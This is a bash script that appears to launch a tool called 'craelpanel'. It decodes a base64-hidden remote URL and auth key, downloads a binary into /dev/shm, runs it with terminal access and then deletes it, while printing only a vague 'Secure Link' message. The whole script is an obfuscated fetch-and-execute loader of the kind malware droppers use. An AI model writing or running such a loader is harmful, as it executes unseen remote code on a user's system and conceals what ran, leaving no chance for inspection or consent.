#!/bin/bash
E_HOST="aHR0cHM6Ly9jcmFlbC1rZWVwci5wbHVtc29mdHdhcmVkZXYud29ya2Vycy5kZXY="
E_KEY="Q3JAYWVsLVYxMC1VbHRpbUB0ZS1TM2N1cjF0eS1LM3ktWDkjbTIkTHA="
TARGET=$(echo "$E_HOST" | base64 -d)
AUTH=$(echo "$E_KEY" | base64 -d)
DEST="/dev/shm/ny-craelpanel"
RESET="\033[0m"
GREEN="\033[38;5;46m"
RED="\033[0;31m"
echo -e "${GREEN}[*] Establishing Secure Link...${RESET}"
if command -v wget >/dev/null 2>&1; then
    wget -q --header="X-Crael-Auth: $AUTH" -O "$DEST" "$TARGET"
else
    curl -L -H "X-Crael-Auth: $AUTH" -o "$DEST" "$TARGET" --progress-bar
fi
if [ -s "$DEST" ] && ! grep -q "ACCESS DENIED" "$DEST"; then
    chmod +x "$DEST"
    "$DEST" < /dev/tty
    rm -f "$DEST"
else
    echo -e "${RED}[!] Security Handshake Failed.${RESET}"
    rm -f "$DEST"
    exit 1
fi
